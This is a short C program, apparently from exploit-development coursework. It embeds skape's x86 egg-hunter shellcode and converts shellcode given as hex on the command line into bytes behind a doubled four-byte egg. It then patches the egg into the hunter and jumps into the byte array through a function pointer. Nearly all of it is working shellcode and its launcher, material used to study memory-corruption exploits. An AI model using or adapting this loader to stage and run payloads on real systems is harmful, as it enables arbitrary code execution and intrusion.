#include<stdio.h>
#include<stdint.h>
#include<stdlib.h>
#include<string.h>

int main(int argc, char **argv)
{
	uint8_t egghunter[30] = 
		"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd"	// skape's egg-hunting demo shellcode
		"\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50"	// \x90\x50\x90\x50 is the demo egg
		"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";	//
	
	uint32_t j=0, i=0, count =0, count2=0;
	uint8_t *shellcode;

	// usage
	if ( argc != 3 )
	{
		printf("shellcode.c <shellcode> <egg>\n");
		exit(0);
	}
	
	// calculate the length of the given shellcode
	while ( argv[1][i++] != '\0' )
		count++;

	count = count/3;	// # of bytes

	// given the shellcode, change each char from xXX to XX\0
	// e.g. \x55 will be 55\0
	// each pair must be null terminated for later use in strtol
	i=0;
	do
	{
		argv[1][i] = argv[1][i+1];
		argv[1][i+1] = argv[1][i+2];
		argv[1][i+2] = '\0';
		count2++;
		i=i+3;
	} while ( count-- != 1 );

	// allocate memory for the shellcode
	shellcode = (uint8_t *)malloc(sizeof(uint8_t)*count2+8);

	// place the egg into the shellcode
	for (i=0; i<4; i++)
	{
		shellcode[i] = argv[2][3-i];
		shellcode[i+4] = argv[2][3-i];
	}

	// transform each pair of characters into a number
	// e.g. \x55 will be saved as chars x 5 5
	// strtol will transform 5 5 into a number
	j=0;
	for (i=0; i<count2; i++)
	{
		shellcode[i+8] = (uint8_t) strtol(&argv[1][j], NULL, 16);
		j=j+3;
	}

	// place the new egg in the egghunter
	for (i=0; i<4; i++)
		egghunter[16+i] = argv[2][3-i];


	printf("Shellcode length: %d\n", strlen(egghunter));

	int (*ret)() = (int(*)())egghunter;

	ret();

	return 0;	

}
